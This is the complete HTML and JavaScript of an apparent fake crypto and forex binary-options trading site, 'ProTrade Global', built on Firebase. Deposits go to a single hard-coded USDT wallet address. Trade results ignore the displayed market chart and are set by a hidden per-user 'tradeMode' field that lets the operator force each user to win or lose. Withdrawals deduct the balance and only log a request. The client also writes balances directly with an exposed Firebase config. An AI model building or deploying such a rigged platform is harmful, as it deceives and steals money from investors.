<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ProTrade Global | Elite Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { background: #05070a; color: #e2e8f0; font-family: 'Plus Jakarta Sans', sans-serif; overflow: hidden; height: 100dvh; margin: 0; }
        .glass-card { background: rgba(17, 24, 39, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
        .auth-input { background: #1a1f29; border: 1px solid #2d3748; padding: 14px; border-radius: 12px; width: 100%; color: white; outline: none; }
        #appTerminal { display: none; height: 100dvh; flex-direction: column; padding: 8px; }
        #authSection { display: none; } 
        .timer-badge { position: absolute; bottom: 10px; right: 10px; background: #eab308; color: black; padding: 5px 15px; border-radius: 50px; font-weight: 800; display: none; z-index: 100; font-size: 12px; }
        .btn-grad-green { background: linear-gradient(135deg, #22c55e 0%, #15803d 100%); }
        .btn-grad-red { background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%); }
        #loadingScreen { position: fixed; inset: 0; background: #05070a; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .loader-spin { width: 35px; height: 35px; border: 3px solid #1a1f29; border-top: 3px solid #eab308; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        select option { background: #1a1f29; color: white; }
    </style>
</head>
<body>

    <div id="loadingScreen">
        <div class="loader-spin"></div>
        <p class="mt-3 text-[9px] font-bold text-yellow-500 uppercase tracking-widest">Verifying Session...</p>
    </div>

    <div id="authSection" class="h-full flex items-center justify-center p-4">
        <div class="glass-card w-full max-w-sm p-8 rounded-[32px]">
            <h1 class="text-3xl font-black text-center mb-8 uppercase italic">ProTrade</h1>
            <div class="flex bg-black/40 p-1.5 rounded-2xl mb-8">
                <button onclick="switchAuth('login')" id="loginTab" class="flex-1 py-3 text-sm font-bold">Login</button>
                <button onclick="switchAuth('reg')" id="regTab" class="flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl">Registration</button>
            </div>
            <input type="email" id="userEmail" placeholder="Email" class="auth-input mb-4">
            <input type="password" id="userPass" placeholder="Password" class="auth-input mb-6">
            <button onclick="handleAuth()" id="authBtn" class="w-full py-4 bg-blue-600 text-white font-black rounded-2xl uppercase">Registration</button>
        </div>
    </div>

    <div id="appTerminal">
        <header class="flex justify-between items-center mb-2 px-1">
            <div class="flex items-center gap-2">
                <div onclick="showM('settingsM')" id="userInitial" class="w-8 h-8 rounded-full bg-yellow-500 flex items-center justify-center text-black font-extrabold cursor-pointer text-xs">?</div>
                <div><p class="text-[7px] text-gray-500 font-bold uppercase">Balance</p><h1 id="balanceDisp" class="text-lg font-black text-white">$0.00</h1></div>
            </div>
            <div class="flex gap-1.5">
                <button onclick="showM('depM')" class="bg-yellow-500 text-black px-3 py-1.5 rounded-lg text-[9px] font-black uppercase">Deposit</button>
                <button onclick="showM('witM')" class="bg-white/10 text-white px-3 py-1.5 rounded-lg text-[9px] font-black uppercase border border-white/10">Withdraw</button>
            </div>
        </header>

        <div class="mb-2">
            <select id="assetSelect" onchange="loadChart(this.value)" class="w-full bg-white/5 border border-white/10 rounded-xl p-2 text-yellow-500 font-bold text-[11px] outline-none">
                <optgroup label="CRYPTO (TOP)">
                    <option value="BINANCE:BTCUSDT">BTC/USDT (Bitcoin)</option>
                    <option value="BINANCE:ETHUSDT">ETH/USDT (Ethereum)</option>
                    <option value="BINANCE:SOLUSDT">SOL/USDT (Solana)</option>
                    <option value="BINANCE:BNBUSDT">BNB/USDT</option>
                    <option value="BINANCE:XRPUSDT">XRP/USDT</option>
                    <option value="BINANCE:DOGEUSDT">DOGE/USDT</option>
                    <option value="BINANCE:ADAUSDT">ADA/USDT</option>
                    <option value="BINANCE:MATICUSDT">MATIC/USDT</option>
                </optgroup>
                <optgroup label="FOREX (MAJOR)">
                    <option value="FX:EURUSD">EUR/USD</option>
                    <option value="FX:GBPUSD">GBP/USD</option>
                    <option value="FX:USDJPY">USD/JPY</option>
                    <option value="FX:AUDUSD">AUD/USD</option>
                    <option value="FX:USDCAD">USD/CAD</option>
                    <option value="FX:GBPJP">GBP/JPY</option>
                    <option value="FX:EURJPY">EUR/JPY</option>
                </optgroup>
                <optgroup label="STOCKS & METALS">
                    <option value="OANDA:XAUUSD">GOLD (XAU/USD)</option>
                    <option value="OANDA:XAGUSD">SILVER</option>
                    <option value="NASDAQ:AAPL">APPLE</option>
                    <option value="NASDAQ:TSLA">TESLA</option>
                    <option value="NASDAQ:NVDA">NVIDIA</option>
                    <option value="NASDAQ:NFLX">NETFLIX</option>
                </optgroup>
                </select>
        </div>

        <main class="relative flex-grow rounded-[24px] overflow-hidden bg-black mb-2 border border-white/5">
            <div id="tv_chart" class="h-full w-full"></div>
            <div id="tradeTimer" class="timer-badge">‚è± <span id="timerText">00:00</span></div>
        </main>

        <footer class="glass-card p-3 rounded-[24px]">
            <div class="grid grid-cols-2 gap-3 mb-3">
                <div class="bg-black/40 p-2 rounded-xl border border-white/5">
                    <span class="text-[8px] text-gray-500 font-bold uppercase block ml-1">Amount</span>
                    <input id="tradeAmt" type="number" value="100" class="bg-transparent outline-none font-black text-white text-base w-full px-1">
                </div>
                <div class="bg-black/40 p-2 rounded-xl border border-white/5">
                    <span class="text-[8px] text-gray-500 font-bold uppercase block ml-1">Time</span>
                    <select id="duration" class="bg-transparent font-black text-white text-base w-full outline-none">
                        <option value="5">5s</option><option value="10">10s</option>
                        <option value="15">15s</option><option value="30">30s</option>
                        <option value="60">1m</option><option value="120">2m</option>
                        <option value="300">5m</option>
                    </select>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-3">
                <button onclick="initTrade('UP')" class="btn-grad-green h-12 rounded-xl font-black text-white uppercase text-sm">Call</button>
                <button onclick="initTrade('DOWN')" class="btn-grad-red h-12 rounded-xl font-black text-white uppercase text-sm">Put</button>
            </div>
        </footer>
    </div>

    <div id="depM" class="modal">
        <div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center">
            <div id="dStep1">
                <h2 class="text-xl font-black text-yellow-500 mb-6 uppercase">Deposit</h2>
                <input type="number" id="depAmtInput" placeholder="Amount ($)" class="auth-input mb-6 text-center">
                <button onclick="toDStep(2)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">Next</button>
            </div>
            <div id="dStep2" class="hidden">
                <p class="text-[10px] text-gray-400 mb-4">Send USDT (TRC20)</p>
                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM" class="mx-auto mb-4 bg-white p-2 rounded-lg">
                <p class="text-[8px] mb-4 break-all">TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM</p>
                <button onclick="toDStep(3)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl">I HAVE PAID</button>
            </div>
            <div id="dStep3" class="hidden">
                <input type="text" id="depTx" placeholder="TXID / Transaction ID" class="auth-input mb-4">
                <button onclick="submitFinalDep()" class="w-full py-4 bg-blue-600 text-white font-black rounded-2xl">SUBMIT PROOF</button>
            </div>
            <button onclick="hideM('depM')" class="mt-4 text-xs text-gray-500 uppercase">Cancel</button>
        </div>
    </div>

    <div id="witM" class="modal">
        <div class="glass-card p-8 rounded-[32px] w-full max-w-sm">
            <h2 class="text-xl font-black text-yellow-500 mb-6 text-center uppercase">Withdraw</h2>
            <input type="text" id="witAddr" placeholder="Wallet Address" class="auth-input mb-4">
            <input type="number" id="witAmt" placeholder="Amount" class="auth-input mb-6">
            <button onclick="submitWit()" class="w-full py-4 bg-white text-black font-black rounded-2xl uppercase">Request</button>
            <button onclick="hideM('witM')" class="w-full mt-4 text-gray-500 text-center text-xs">CLOSE</button>
        </div>
    </div>

    <div id="settingsM" class="modal">
        <div class="glass-card p-6 rounded-[32px] w-full max-w-sm">
            <h2 class="text-center font-black mb-6 uppercase text-gray-500 text-xs">Profile</h2>
            <div id="profileCircle" class="w-16 h-16 bg-yellow-500 rounded-full mx-auto flex items-center justify-center text-2xl font-black text-black mb-4">?</div>
            <p id="sEmailDisp" class="text-center text-sm mb-8"></p>
            <button onclick="auth.signOut().then(()=>location.reload())" class="w-full py-4 bg-red-600/20 text-red-500 rounded-2xl font-black uppercase text-xs">Logout</button>
            <button onclick="hideM('settingsM')" class="w-full mt-4 text-gray-500 text-center text-xs uppercase">Close</button>
        </div>
    </div>

    <div id="resultM" class="modal"><div id="resultBox" class="glass-card p-10 rounded-[40px] text-center border border-white/10 w-80"></div></div>

    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <script>
        const firebaseConfig = { apiKey: "AIzaSyAySRA1YSpTpmC8WjnKmDhnNMHkEmkeP50", authDomain: "waqas-47f30.firebaseapp.com", projectId: "waqas-47f30", storageBucket: "waqas-47f30.appspot.com", messagingSenderId: "374104279093", appId: "1:374104279093:web:6e1844b60456c700940364" };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth(), db = firebase.firestore();
        let userData = null, mode = 'reg', chartLoaded = false;

        auth.onAuthStateChanged(user => {
            const loader = document.getElementById('loadingScreen');
            if(user) {
                db.collection('users').doc(user.uid).onSnapshot(doc => {
                    userData = doc.data();
                    if(userData) {
                        document.getElementById('balanceDisp').innerText = "$" + (userData.balance || 0).toFixed(2);
                        document.getElementById('userInitial').innerText = user.email[0].toUpperCase();
                        document.getElementById('profileCircle').innerText = user.email[0].toUpperCase();
                        document.getElementById('sEmailDisp').innerText = user.email;
                        document.getElementById('authSection').style.display = 'none';
                        document.getElementById('appTerminal').style.display = 'flex';
                        if(!chartLoaded) { loadChart('BINANCE:BTCUSDT'); chartLoaded = true; }
                        loader.style.display = 'none';
                    }
                }, () => loader.style.display = 'none');
            } else {
                document.getElementById('authSection').style.display = 'flex';
                document.getElementById('appTerminal').style.display = 'none';
                loader.style.display = 'none';
            }
        });

        async function handleAuth() {
            const e = document.getElementById('userEmail').value, p = document.getElementById('userPass').value;
            if(!e || !p) return alert("Empty fields!");
            document.getElementById('loadingScreen').style.display = 'flex';
            try {
                if(mode==='reg') {
                    const r = await auth.createUserWithEmailAndPassword(e,p);
                    await db.collection('users').doc(r.user.uid).set({email:e, balance:0, tradeMode:'normal'});
                } else await auth.signInWithEmailAndPassword(e,p);
            } catch(err) { alert(err.message); document.getElementById('loadingScreen').style.display = 'none'; }
        }

        function loadChart(s) { new TradingView.widget({"autosize":true, "symbol":s, "interval":"1", "theme":"dark", "container_id":"tv_chart", "hide_top_toolbar":true}); }
        function showM(id) { document.getElementById(id).style.display = 'flex'; }
        function hideM(id) { document.getElementById(id).style.display = 'none'; }
        function toDStep(s) { [1,2,3].forEach(x => document.getElementById('dStep'+x).classList.add('hidden')); document.getElementById('dStep'+s).classList.remove('hidden'); }
        
        async function submitFinalDep() {
            const tx = document.getElementById('depTx').value;
            if(!tx) return alert("Enter TXID");
            await db.collection('requests').add({uid:auth.currentUser.uid, txid:tx, amount:document.getElementById('depAmtInput').value, time:Date.now()});
            alert("Submitted!"); hideM('depM');
        }

        async function submitWit() {
            const amt = parseFloat(document.getElementById('witAmt').value);
            if(amt > userData.balance) return alert("Low balance");
            await db.collection('users').doc(auth.currentUser.uid).update({balance: firebase.firestore.FieldValue.increment(-amt)});
            await db.collection('withdrawals').add({uid:auth.currentUser.uid, amount:amt, address:document.getElementById('witAddr').value});
            alert("Requested!"); hideM('witM');
        }

        async function initTrade(type) {
            const amt = parseFloat(document.getElementById('tradeAmt').value), dur = parseInt(document.getElementById('duration').value);
            if(amt > userData.balance || amt <= 0) return alert("Check Balance/Amount");
            await db.collection('users').doc(auth.currentUser.uid).update({balance: firebase.firestore.FieldValue.increment(-amt)});
            document.getElementById('tradeTimer').style.display = 'block';
            let l = dur;
            let iv = setInterval(() => {
                let m = Math.floor(l/60), s = l%60;
                document.getElementById('timerText').innerText = `${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
                if(l <= 0) { clearInterval(iv); document.getElementById('tradeTimer').style.display = 'none'; showRes(amt); }
                l--;
            }, 1000);
        }

        async function showRes(amt) {
            const m = userData.tradeMode || 'normal';
            let win = m === 'profit' ? true : (m === 'loss' ? false : Math.random() > 0.5);
            const p = amt * 1.82, box = document.getElementById('resultBox');
            if(win) {
                await db.collection('users').doc(auth.currentUser.uid).update({balance: firebase.firestore.FieldValue.increment(p)});
                box.innerHTML = `<h2 class="text-green-500 font-black text-xl">PROFIT</h2><h1 class="text-4xl">+$${p.toFixed(2)}</h1>`;
            } else {
                box.innerHTML = `<h2 class="text-red-500 font-black text-xl">LOSS</h2><h1 class="text-4xl">-$${amt.toFixed(2)}</h1>`;
            }
            box.innerHTML += `<button onclick="hideM('resultM')" class="w-full bg-white/10 py-3 rounded-xl mt-6 uppercase font-bold text-sm">Continue</button>`;
            showM('resultM');
        }

        function switchAuth(t) {
            mode = t;
            document.getElementById('loginTab').className = t==='login' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold';
            document.getElementById('regTab').className = t==='reg' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold';
            document.getElementById('authBtn').innerText = t==='login' ? 'Login' : 'Registration';
        }
    </script>
</body>
</html>
